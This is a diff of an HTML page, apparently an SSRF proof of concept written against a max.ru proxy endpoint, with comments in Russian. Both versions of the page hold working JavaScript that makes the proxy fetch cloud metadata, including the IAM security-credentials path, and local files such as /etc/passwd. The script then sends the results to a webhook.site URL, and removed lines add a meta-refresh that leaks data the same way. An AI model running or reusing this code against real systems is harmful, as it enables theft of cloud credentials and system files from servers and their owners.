@@ -2,55 +2,45 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Critical Security PoC</title>
-
-    <meta property="og:description" content="Check: https://max.ru/proxy?url=http://169.254.169.254.nip.io/latest/meta-data/">
-    
-    <meta http-equiv="refresh" content="0; url=https://max.ru/proxy?url=https://webhook.site/db69ae80-4433-4821-8c44-090b6df24af8?leak=SUCCESS">
 </head>
 <body>
     <script>
         const hook = "https://webhook.site/db69ae80-4433-4821-8c44-090b6df24af8";
         const proxy = "https://max.ru/proxy?url=";
-        
-        // Эти цели дадут нам названия разделов (директории)
-        const targets = {
-            "metadata_dirs": "http://169.254.169.254.nip.io/latest/meta-data/",
-            "hostname": "http://169.254.169.254.nip.io/latest/meta-data/hostname",
-            "etc_issue": "file:///etc/issue" // В этом файле название дистрибутива (Ubuntu/Debian)
-        };
 
-        async function exfiltrate() {
-            // Сначала маякнем, что скрипт пошел
-            new Image().src = hook + "?status=JS_START";
+        async function steal() {
+            // Цели: метаданные и системные файлы
+            const targets = [
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/default",
+                "file:///etc/passwd",
+                "file:///etc/hosts"
+            ];
 
-            for (let [name, target] of Object.entries(targets)) {
+            for (let t of targets) {
+                // ХИТРОСТЬ: Заставляем сервер max.ru СКАЧАТЬ данные и отправить их нам
+                // Мы используем их же прокси, чтобы он обратился к самому себе
+                const attackUrl = proxy + encodeURIComponent(t);
+                
                 try {
-                    // Используем метод 'no-cors' для обхода политик, 
-                    // но для чтения текста нам нужно попытаться обычным fetch
-                    const response = await fetch(proxy + encodeURIComponent(target));
-                    const text = await response.text();
-
-                    // Если в ответе НЕТ слова "doctype" или "SvelteKit" - значит это ЧИСТЫЕ данные!
-                    if (text.length > 0 && !text.includes("doctype") && !text.includes("svelte")) {
-                        // Шлем на вебхук только реальный улов (Base64 для надежности)
-                        fetch(hook + "/DATA_FOUND_" + name, {
+                    const r = await fetch(attackUrl);
+                    const data = await r.text();
+                    
+                    // Если в тексте есть ключевые слова конфигов, шлем на вебхук через POST
+                    if (data.includes("root:") || data.includes("AccessKeyId") || data.length > 500) {
+                        await fetch(hook + "?found=" + btoa(t), {
                             method: "POST",
                             mode: "no-cors",
-                            body: btoa(text.substring(0, 500))
+                            body: data 
                         });
                     } else {
-                        // Если все же пришел HTML, шлем первые 50 символов (вдруг там ошибка с путем)
-                        new Image().src = hook + "?debug=" + name + "&snippet=" + encodeURIComponent(text.substring(0, 50));
+                        // Если все еще лезет HTML, пробуем вытащить его заголовки
+                        new Image().src = hook + "?debug_size=" + data.length + "&target=" + btoa(t);
                     }
-                } catch (e) {
-                    new Image().src = hook + "?error=" + name;
-                }
+                } catch(e) {}
             }
         }
-
-        exfiltrate();
+        steal();
     </script>
-    <h1>hi</h1>
+    <h1>YO</h1>
 </body>
 </html>
